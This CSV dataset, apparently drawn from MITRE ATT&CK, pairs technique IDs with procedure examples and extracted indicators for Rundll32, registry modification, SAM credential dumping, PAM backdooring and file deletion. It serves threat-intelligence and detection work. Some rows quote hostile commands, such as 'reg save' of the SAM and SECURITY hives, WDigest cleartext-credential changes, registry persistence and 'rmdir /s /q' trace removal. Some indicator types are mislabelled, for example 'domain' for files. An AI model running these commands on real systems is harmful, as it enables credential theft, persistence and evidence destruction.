T1218.011,Rundll32,"APT28  executed  CHOPSTICK  by using rundll32 commands such as  rundll32.exe ""C:\Windows\twain_64.dll"" .  APT28  also executed a .dll for a first stage dropper using rundll32.exe. An  APT28  loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.   [8]      [6]      [9]      [10]      [11]      [12]",Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,"APT28  executed  CHOPSTICK  by using rundll32 commands such as  rundll32.exe ""C:\Windows\twain_64.dll"" .  APT28  also executed a .dll for a first stage dropper using rundll32.exe. An  APT28  loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.   [8]      [6]      [9]      [10]      [11]      [12]",Procedure Examples,file,twain_64.dll
T1218.011,Rundll32,APT29  has used  Rundll32.exe  to execute payloads.   [13]      [14]      [15],Procedure Examples,file,Rundll32.exe
T1218.011,Rundll32,APT32  malware has used rundll32.exe to execute an initial infection process.   [17],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,"APT38  has used rundll32.exe to execute binaries, scripts, and Control Panel Item files and to execute code via proxy to avoid triggering security tools.   [18]",Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,APT41  has used rundll32.exe to execute a loader.   [19],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,Attor 's installer plugin can schedule rundll32.exe to load the dispatcher.   [20],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,Bad Rabbit  has used rundll32 to launch a malicious DLL as  C:Windowsinfpub.dat .   [22],Procedure Examples,path,C:Windowsinfpub.dat
T1218.011,Rundll32,"Bisonal  has used rundll32.exe to execute as part of the Registry Run key it adds:  HKEY_CURRENT_USER \Software\Microsoft\Windows\CurrentVersion\Run\""vert"" = ""rundll32.exe c:\windows\temp\pvcu.dll , Qszdez"" .   [23]",Procedure Examples,path,c:\windows\temp\pvcu.dll
T1218.011,Rundll32,"Bisonal  has used rundll32.exe to execute as part of the Registry Run key it adds:  HKEY_CURRENT_USER \Software\Microsoft\Windows\CurrentVersion\Run\""vert"" = ""rundll32.exe c:\windows\temp\pvcu.dll , Qszdez"" .   [23]",Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,"Bisonal  has used rundll32.exe to execute as part of the Registry Run key it adds:  HKEY_CURRENT_USER \Software\Microsoft\Windows\CurrentVersion\Run\""vert"" = ""rundll32.exe c:\windows\temp\pvcu.dll , Qszdez"" .   [23]",Procedure Examples,file,pvcu.dll
T1218.011,Rundll32,Blue Mockingbird  has executed custom-compiled XMRIG miner DLLs using rundll32.exe.   [25],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,Cobalt Strike  can use  rundll32.exe  to load DLL from the command line.   [32]      [30],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,"The  CozyCar  dropper copies the system file rundll32.exe to the install location for the malware, then uses the copy of rundll32.exe to load and execute the main  CozyCar  component.   [36]",Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,"After copying itself to a DLL file, a variant of  Elise  calls the DLL file using rundll32.exe.   [39]",Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,Variants of  Emissary  have used rundll32.exe in Registry values added to establish persistence.   [40],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,Rundll32.exe is used as a way of executing  Flame  at the command-line.   [45],Procedure Examples,file,Rundll32.exe
T1218.011,Rundll32,GreyEnergy  uses PsExec locally in order to execute rundll32.exe at the highest privileges (NTAUTHORITY\SYSTEM).   [44],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,Heyoka Backdoor  can use rundll32.exe to gain execution.   [52],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,InvisiMole  has used rundll32.exe for execution.   [53],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,JHUHUGIT  is executed using rundll32.exe.   [54]      [55],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,Kimsuky  has used  rundll32.exe  to execute malicious scripts and malware on a victim's network.   [56],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,Kwampirs  uses rundll32.exe in a Registry value added to establish persistence.   [60],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,LazyScripter  has used  rundll32.exe  to execute  Koadic  stagers.   [64],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,Magic Hound  has used rundll32.exe to execute MiniDump from comsvcs.dll when dumping LSASS memory.   [65],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,Magic Hound  has used rundll32.exe to execute MiniDump from comsvcs.dll when dumping LSASS memory.   [65],Procedure Examples,file,comsvcs.dll
T1218.011,Rundll32,Matryoshka  uses rundll32.exe in a Registry Run key value for execution as part of its persistence mechanism.   [66],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,MegaCortex  has used  rundll32.exe  to load a DLL for file encryption.   [67],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,Mongall  can use  rundll32.exe  for execution.   [52],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,Mosquito 's launcher uses rundll32.exe in a Registry Key value to start the main backdoor capability.   [68],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,MuddyWater  has used malware that leveraged rundll32.exe in a Registry Run key to execute a .dll.   [69],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,NotPetya  uses  rundll32.exe  to install itself on remote systems when accessed via  PsExec  or  wmic .   [72],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,"During  Operation Spalax , the threat actors used  rundll32.exe  to execute malicious installers.   [73]",Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,PcShare  has used  rundll32.exe  for execution.   [47],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,PolyglotDuke  can be executed using rundll32.exe.   [42],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,PowerDuke  uses rundll32.exe to load.   [74],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,Prikormka  uses rundll32.exe to load its DLL.   [75],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,Pteranodon  executes functions using rundll32.exe.   [76],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,QakBot  can use Rundll32.exe to enable C2 communication.   [78]      [79]      [80]      [81],Procedure Examples,file,Rundll32.exe
T1218.011,Rundll32,Ragnar Locker  has used rundll32.exe to execute components of VirtualBox.   [82],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,RTM  runs its core DLL file using rundll32.exe.   [83]      [84],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,Sakula  calls cmd.exe to run various DLL files via rundll32.   [85],Procedure Examples,file,cmd.exe
T1218.011,Rundll32,Sandworm Team  used a backdoor which could execute a supplied DLL using rundll32.exe.   [86],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,SDBbot  has used rundll32.exe to execute DLLs.   [46],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,ServHelper  contains a module for downloading and executing DLLs that leverages  rundll32.exe .   [87],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,Sibot  has executed downloaded DLLs with  rundll32.exe .   [88],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,Squirrelwaffle  has been executed using  rundll32.exe .   [89]      [90],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,TA505  has leveraged  rundll32.exe  to execute malicious DLLs.   [92]      [87],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,TA551  has used rundll32.exe to load malicious DLLs.   [93],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,USBferry  can execute rundll32.exe in memory to avoid detection.   [94],Procedure Examples,file,rundll32.exe
T1218.011,Rundll32,ZxShell  has used rundll32.exe to execute other DLLs and named pipes.   [97],Procedure Examples,file,rundll32.exe
T1547.014,Active Setup,"Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.   [1]    These programs will be executed under the context of the user and will have the account's associated permissions level.   Adversaries may abuse Active Setup by creating a key under   HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\  and setting a malicious value for  StubPath . This value will serve as the program that will be executed when a user logs into the computer.   [2]      [3]      [4]      [5]      [6]      Adversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use  Masquerading  to make the Registry entries look as if they are associated with legitimate programs.",Description,registry-key,HKLM\SOFTWARE\Microsoft\Active Setup\Installed
T1547.014,Active Setup,"Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.   [1]    These programs will be executed under the context of the user and will have the account's associated permissions level.   Adversaries may abuse Active Setup by creating a key under   HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\  and setting a malicious value for  StubPath . This value will serve as the program that will be executed when a user logs into the computer.   [2]      [3]      [4]      [5]      [6]      Adversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use  Masquerading  to make the Registry entries look as if they are associated with legitimate programs.",Description,registry-key,HKLM\SOFTWARE\Microsoft\Active
T1574.013,KernelCallbackTable,"Adversaries may abuse the  KernelCallbackTable  of a process to hijack its execution flow in order to run their own payloads.   [1]      [2]    The  KernelCallbackTable  can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once  user32.dll  is loaded.   [3]      An adversary may hijack the execution flow of a process using the  KernelCallbackTable  by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as  Reflective Code Loading  or  Process Injection  into another process.   A pointer to the memory address of the  KernelCallbackTable  can be obtained by locating the PEB (ex: via a call to the  NtQueryInformationProcess()   Native API  function).   [4]    Once the pointer is located, the  KernelCallbackTable  can be duplicated, and a function in the table (e.g.,  fnCOPYDATA ) set to the address of a malicious payload (ex: via  WriteProcessMemory() ). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.   [1]      The tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the  KernelCallbackTable  may also be restored to its original state by the rest of the malicious payload.   [1]    Use of the  KernelCallbackTable  to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.",Description,file,user32.dll
T1059,Command and Scripting Interpreter,WINERACK  can create a reverse shell that utilizes statically-linked Wine cmd.exe code to emulate Windows command prompt commands.   [44],Procedure Examples,file,cmd.exe
T1556.003,Pluggable Authentication Modules,"Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is  pam_unix.so , which retrieves, sets, and verifies account authentication information in  /etc/passwd  and  /etc/shadow .   [1]      [2]      [3]      Adversaries may modify components of the PAM system to create backdoors. PAM components, such as  pam_unix.so , can be patched to accept arbitrary adversary supplied values as legitimate credentials.   [4]      Malicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.   [5]      [1]",Description,domain,pam_unix.so
T1556.003,Pluggable Authentication Modules,Skidmap  has the ability to replace the pam_unix.so file on an infected machine with its own malicious version that accepts a specific backdoor password for all users.   [7],Procedure Examples,domain,pam_unix.so
T1003.002,Security Account Manager,"IceApple 's Credential Dumper module can dump encrypted password hashes from SAM registry keys, including  HKLM\SAM\SAM\Domains\Account\F  and  HKLM\SAM\SAM\Domains\Account\Users\*\V .   [11]",Procedure Examples,registry-key,HKLM\SAM\SAM\Domains\Account\F
T1003.002,Security Account Manager,"IceApple 's Credential Dumper module can dump encrypted password hashes from SAM registry keys, including  HKLM\SAM\SAM\Domains\Account\F  and  HKLM\SAM\SAM\Domains\Account\Users\*\V .   [11]",Procedure Examples,registry-key,HKLM\SAM\SAM\Domains\Account\Users
T1003.002,Security Account Manager,menuPass  has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.   [16]      [17],Procedure Examples,domain,secretsdump.py
T1003.002,Security Account Manager,"During  Operation CuckooBees , the threat actors leveraged a custom tool to dump OS credentials and used following commands:  reg save HKLM\\SYSTEM system.hiv ,  reg save HKLM\\SAM sam.hiv , and  reg save HKLM\\SECURITY security.hiv , to dump SAM, SYSTEM and SECURITY hives.   [24]",Procedure Examples,domain,security.hiv
T1003.002,Security Account Manager,"During  Operation CuckooBees , the threat actors leveraged a custom tool to dump OS credentials and used following commands:  reg save HKLM\\SYSTEM system.hiv ,  reg save HKLM\\SAM sam.hiv , and  reg save HKLM\\SECURITY security.hiv , to dump SAM, SYSTEM and SECURITY hives.   [24]",Procedure Examples,domain,sam.hiv
T1003.002,Security Account Manager,"During  Operation CuckooBees , the threat actors leveraged a custom tool to dump OS credentials and used following commands:  reg save HKLM\\SYSTEM system.hiv ,  reg save HKLM\\SAM sam.hiv , and  reg save HKLM\\SECURITY security.hiv , to dump SAM, SYSTEM and SECURITY hives.   [24]",Procedure Examples,domain,system.hiv
T1003.002,Security Account Manager,"During  Operation CuckooBees , the threat actors leveraged a custom tool to dump OS credentials and used following commands:  reg save HKLM\\SYSTEM system.hiv ,  reg save HKLM\\SAM sam.hiv , and  reg save HKLM\\SECURITY security.hiv , to dump SAM, SYSTEM and SECURITY hives.   [24]",Procedure Examples,registry-key,HKLM\\SYSTEM
T1003.002,Security Account Manager,"During  Operation CuckooBees , the threat actors leveraged a custom tool to dump OS credentials and used following commands:  reg save HKLM\\SYSTEM system.hiv ,  reg save HKLM\\SAM sam.hiv , and  reg save HKLM\\SECURITY security.hiv , to dump SAM, SYSTEM and SECURITY hives.   [24]",Procedure Examples,registry-key,HKLM\\SAM
T1003.002,Security Account Manager,"During  Operation CuckooBees , the threat actors leveraged a custom tool to dump OS credentials and used following commands:  reg save HKLM\\SYSTEM system.hiv ,  reg save HKLM\\SAM sam.hiv , and  reg save HKLM\\SECURITY security.hiv , to dump SAM, SYSTEM and SECURITY hives.   [24]",Procedure Examples,registry-key,HKLM\\SECURITY
T1136,Create Account,Indrik Spider  used  wmic.exe  to add a new user to the system.   [1],Procedure Examples,file,wmic.exe
T1059.004,Unix Shell,APT41  executed  file /bin/pwd  in activity exploiting CVE-2019-19781 against Citrix devices.   [6],Procedure Examples,cve,CVE-2019-19781
T1059.004,Unix Shell,Skidmap  has used  pm.sh  to download and install its main payload.   [39],Procedure Examples,domain,pm.sh
T1059.004,Unix Shell,"XCSSET  uses a shell script to execute Mach-o files and  osacompile  commands such as,  osacompile -x -o xcode.app main.applescript .   [44]",Procedure Examples,domain,xcode.app
T1218.002,Control Panel,"Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.   Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a  CPlApplet  function.   [1]      [2]    For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.   [1]    Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.   [1]       [2]      [3]      Malicious Control Panel items can be delivered via  Phishing  campaigns   [2]      [3]    or executed as part of multi-stage malware.   [4]    Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.   Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to  HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls . Even when these registered DLLs do not comply with the CPL file specification and do not export  CPlApplet  functions, they are loaded and executed through its  DllEntryPoint  when Control Panel is executed. CPL files not exporting  CPlApplet  are not directly executable.   [5]",Description,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls
T1218.002,Control Panel,"Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.   Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a  CPlApplet  function.   [1]      [2]    For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.   [1]    Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.   [1]       [2]      [3]      Malicious Control Panel items can be delivered via  Phishing  campaigns   [2]      [3]    or executed as part of multi-stage malware.   [4]    Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.   Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to  HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls . Even when these registered DLLs do not comply with the CPL file specification and do not export  CPlApplet  functions, they are loaded and executed through its  DllEntryPoint  when Control Panel is executed. CPL files not exporting  CPlApplet  are not directly executable.   [5]",Description,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Control
T1218.002,Control Panel,"Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.   Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a  CPlApplet  function.   [1]      [2]    For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.   [1]    Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.   [1]       [2]      [3]      Malicious Control Panel items can be delivered via  Phishing  campaigns   [2]      [3]    or executed as part of multi-stage malware.   [4]    Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.   Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to  HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls . Even when these registered DLLs do not comply with the CPL file specification and do not export  CPlApplet  functions, they are loaded and executed through its  DllEntryPoint  when Control Panel is executed. CPL files not exporting  CPlApplet  are not directly executable.   [5]",Description,file,control.exe
T1027.001,Binary Padding,"Rifdoor  has added four additional bytes of data upon launching, then saved the changed version as  C:\ProgramData\Initech\Initech.exe .   [33]",Procedure Examples,path,C:\ProgramData\Initech\Initech.exe
T1027.001,Binary Padding,"Rifdoor  has added four additional bytes of data upon launching, then saved the changed version as  C:\ProgramData\Initech\Initech.exe .   [33]",Procedure Examples,file,Initech.exe
T1112,Modify Registry,Cardinal RAT  sets  HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load  to point to its executable.   [23],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load
T1112,Modify Registry,Cardinal RAT  sets  HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load  to point to its executable.   [23],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows
T1112,Modify Registry,Cobalt Strike  can modify Registry values within  HKEY_CURRENT_USER\Software\Microsoft\Office\ \Excel\Security\AccessVBOM\   to enable the execution of additional code.   [31],Procedure Examples,registry-key,HKEY_CURRENT_USER\Software\Microsoft\Office
T1112,Modify Registry,Conficker  adds keys to the Registry at  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services  and various other Registry locations.   [34]      [35],Procedure Examples,registry-key,HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
T1112,Modify Registry,"DarkComet  adds a Registry value for its installation routine to the Registry Key  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System Enable LUA=""0""  and  HKEY_CURRENT_USER\Software\DC3_FEXEC .   [39]      [40]",Procedure Examples,registry-key,HKEY_CURRENT_USER\Software\DC3
T1112,Modify Registry,"DarkComet  adds a Registry value for its installation routine to the Registry Key  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System Enable LUA=""0""  and  HKEY_CURRENT_USER\Software\DC3_FEXEC .   [39]      [40]",Procedure Examples,registry-key,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System
T1112,Modify Registry,"Earth Lusca  modified the registry using the command  reg add ""HKEY_CURRENT_USER\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""[file path]""  for persistence.   [44]",Procedure Examples,registry-key,HKEY_CURRENT_USER\Environment
T1112,Modify Registry,FELIXROOT  deletes the Registry key  HKCU\Software\Classes\Applications\rundll32.exe\shell\open .   [49],Procedure Examples,registry-key,HKCU\Software\Classes\Applications\rundll32
T1112,Modify Registry,FELIXROOT  deletes the Registry key  HKCU\Software\Classes\Applications\rundll32.exe\shell\open .   [49],Procedure Examples,file,rundll32.exe
T1112,Modify Registry,Gamaredon Group  has removed security settings for VBA macro execution by changing registry values  HKCU\Software\Microsoft\Office\&lt;version&gt;\&lt;product&gt;\Security\VBAWarnings  and  HKCU\Software\Microsoft\Office\&lt;version&gt;\&lt;product&gt;\Security\AccessVBOM .   [52]      [53],Procedure Examples,registry-key,HKCU\Software\Microsoft\Office
T1112,Modify Registry,Gorgon Group  malware can deactivate security mechanisms in Microsoft Office by editing several keys and values under  HKCU\Software\Microsoft\Office\ .   [56],Procedure Examples,registry-key,HKCU\Software\Microsoft\Office
T1112,Modify Registry,Grandoreiro  can store its configuration in the Registry at  HKCU\Software\  under frequently changing names including  %USERNAME%  and  ToolTech-RM .   [57],Procedure Examples,registry-key,HKCU\Software
T1112,Modify Registry,HyperStack  can add the name of its communication pipe to  HKLM\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters\NullSessionPipes .   [65],Procedure Examples,registry-key,HKLM\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters\NullSessionPipes
T1112,Modify Registry,LoJax  has modified the Registry key  ‘HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute’  from  ‘autocheck autochk  ’   to  ‘autocheck autoche ’ .   [76],Procedure Examples,registry-key,HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute
T1112,Modify Registry,Mori  can write data to  HKLM\Software\NFC\IPA  and  HKLM\Software\NFC\  and delete Registry values.   [84]      [85],Procedure Examples,registry-key,HKLM\Software\NFC
T1112,Modify Registry,Mori  can write data to  HKLM\Software\NFC\IPA  and  HKLM\Software\NFC\  and delete Registry values.   [84]      [85],Procedure Examples,registry-key,HKLM\Software\NFC\IPA
T1112,Modify Registry,Mosquito  stores configuration values under the Registry key  HKCU\Software\Microsoft[dllname]  and modifies Registry keys under  HKCR\CLSID...\InprocServer32 with a path to the launcher.   [86],Procedure Examples,registry-key,HKCU\Software\Microsoft
T1112,Modify Registry,Mosquito  stores configuration values under the Registry key  HKCU\Software\Microsoft[dllname]  and modifies Registry keys under  HKCR\CLSID...\InprocServer32 with a path to the launcher.   [86],Procedure Examples,registry-key,HKCR\CLSID
T1112,Modify Registry,Netwalker  can add the following registry entry:  HKEY_CURRENT_USER\SOFTWARE{8 random characters} .   [92],Procedure Examples,registry-key,HKEY_CURRENT_USER\SOFTWARE
T1112,Modify Registry,"During  Operation Wocao , the threat actors enabled Wdigest by changing the  HKLM\SYSTEM\\ControlSet001\\Control\\SecurityProviders\\WDigest  registry value from 0 (disabled) to 1 (enabled).   [98]",Procedure Examples,registry-key,HKLM\SYSTEM\\ControlSet001\\Control\\SecurityProviders\\WDigest
T1112,Modify Registry,Pillowmint  has stored its malicious payload in the registry key  HKLM\SOFTWARE\Microsoft\DRM .   [104],Procedure Examples,registry-key,HKLM\SOFTWARE\Microsoft\DRM
T1112,Modify Registry,"PowerShower  has added a registry key so future powershell.exe instances are spawned off-screen by default, and has removed all registry entries that are left behind during the dropper process.   [111]",Procedure Examples,file,powershell.exe
T1112,Modify Registry,QakBot  can store its configuration information in a randomly named subkey under  HKCU\Software\Microsoft .   [113]      [114],Procedure Examples,registry-key,HKCU\Software\Microsoft
T1112,Modify Registry,ROKRAT  can modify the  HKEY_CURRENT_USER\Software\Microsoft\Office\  registry key so it can bypass the VB object model (VBOM) on a compromised host.   [126],Procedure Examples,registry-key,HKEY_CURRENT_USER\Software\Microsoft\Office
T1112,Modify Registry,Sibot  has installed a second-stage script in the  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\sibot  registry key.   [134],Procedure Examples,registry-key,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\sibot
T1112,Modify Registry,"SLOTHFULMEDIA  can add, modify, and/or delete registry keys. It has changed the proxy configuration of a victim system by modifying the  HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap  registry.   [137]",Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap
T1112,Modify Registry,"SLOTHFULMEDIA  can add, modify, and/or delete registry keys. It has changed the proxy configuration of a victim system by modifying the  HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap  registry.   [137]",Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Internet
T1112,Modify Registry,"SUNBURST  had commands that allow an attacker to write or delete registry keys, and was observed stopping services by setting their  HKLM\SYSTEM\CurrentControlSet\services\[service_name]\Start  registry entries to value 4.   [141]      [142]    It also deleted previously-created Image File Execution Options (IFEO) Debugger registry values and registry keys related to HTTP proxy to clean up traces of its activity.   [143]",Procedure Examples,registry-key,HKLM\SYSTEM\CurrentControlSet\services
T1112,Modify Registry,A  Threat Group-3390  tool has created new Registry keys under  HKEY_CURRENT_USER\Software\Classes\  and  HKLM\SYSTEM\CurrentControlSet\services .   [150]      [100],Procedure Examples,registry-key,HKEY_CURRENT_USER\Software\Classes
T1112,Modify Registry,A  Threat Group-3390  tool has created new Registry keys under  HKEY_CURRENT_USER\Software\Classes\  and  HKLM\SYSTEM\CurrentControlSet\services .   [150]      [100],Procedure Examples,registry-key,HKLM\SYSTEM\CurrentControlSet\services
T1112,Modify Registry,ThreatNeedle  can save its configuration data as the following RC4-encrypted Registry key:  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\GameCon .   [151],Procedure Examples,registry-key,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\GameCon
T1112,Modify Registry,TYPEFRAME  can install encrypted configuration data under the Registry key  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Applications\laxhost.dll  and  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PrintConfigs .   [156],Procedure Examples,registry-key,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Applications\laxhost.dll
T1112,Modify Registry,TYPEFRAME  can install encrypted configuration data under the Registry key  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Applications\laxhost.dll  and  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PrintConfigs .   [156],Procedure Examples,file,laxhost.dll
T1112,Modify Registry,Valak  has the ability to modify the Registry key  HKCU\Software\ApplicationContainer\Appsw64  to store information regarding the C2 server and downloads.   [159]      [160]      [161],Procedure Examples,registry-key,HKCU\Software\ApplicationContainer\Appsw64
T1112,Modify Registry,WarzoneRAT  can create  HKCU\Software\Classes\Folder\shell\open\command  as a new registry key during privilege escalation.   [164]      [165],Procedure Examples,registry-key,HKCU\Software\Classes\Folder\shell\open\command
T1112,Modify Registry,Wizard Spider  has modified the Registry key  HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest  by setting the  UseLogonCredential  registry value to  1  in order to force credentials to be stored in clear text in memory.   [168],Procedure Examples,registry-key,HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest
T1112,Modify Registry,Zeus Panda  modifies several Registry keys under  HKCU\Software\Microsoft\Internet Explorer\ PhishingFilter\  to disable phishing filters.   [169],Procedure Examples,registry-key,HKCU\Software\Microsoft\Internet
T1489,Service Stop,"Ryuk  has called  kill.bat  for stopping services, disabling services and killing processes.   [33]",Procedure Examples,file,kill.bat
T1489,Service Stop,"Wizard Spider  has used taskkill.exe and net.exe to stop backup, catalog, cloud, and other services prior to network encryption.   [36]",Procedure Examples,file,taskkill.exe
T1489,Service Stop,"Wizard Spider  has used taskkill.exe and net.exe to stop backup, catalog, cloud, and other services prior to network encryption.   [36]",Procedure Examples,file,net.exe
T1070.004,File Deletion,Cuba  can use the command  cmd.exe /c del  to delete its artifacts from the system.   [51],Procedure Examples,file,cmd.exe
T1070.004,File Deletion,ECCENTRICBANDWAGON  can delete log files generated from the malware stored at  C:\windows\temp\tmp0207 .   [62],Procedure Examples,path,C:\windows\temp\tmp0207
T1070.004,File Deletion,Milan  can delete files via  C:\Windows\system32\cmd.exe /c ping 1.1.1.1 -n 1 -w 3000 &gt; Nul &amp; rmdir /s /q .   [52],Procedure Examples,ip-address,1.1.1.1
T1070.004,File Deletion,Milan  can delete files via  C:\Windows\system32\cmd.exe /c ping 1.1.1.1 -n 1 -w 3000 &gt; Nul &amp; rmdir /s /q .   [52],Procedure Examples,path,C:\Windows\system32\cmd.exe
T1070.004,File Deletion,Milan  can delete files via  C:\Windows\system32\cmd.exe /c ping 1.1.1.1 -n 1 -w 3000 &gt; Nul &amp; rmdir /s /q .   [52],Procedure Examples,file,cmd.exe
T1070.004,File Deletion,"During  Operation Wocao , the threat actors consistently removed traces of their activity by first overwriting a file using  /c cd /d c:\windows\temp\ &amp; copy \\&lt;IP ADDRESS&gt;\c$\windows\system32\devmgr.dll \\&lt;IP ADDRESS&gt;\c$\windows\temp\LMAKSW.ps1 /y  and then deleting the overwritten file using  /c cd /d c:\windows\temp\ &amp; del \\&lt;IP ADDRESS&gt;\c$\windows\temp\LMAKSW.ps1 .   [165]",Procedure Examples,path,/c cd /d c:\windows\temp\ &amp; copy \\&lt;IP ADDRESS&gt;\c$\windows\system32\devmgr.dll
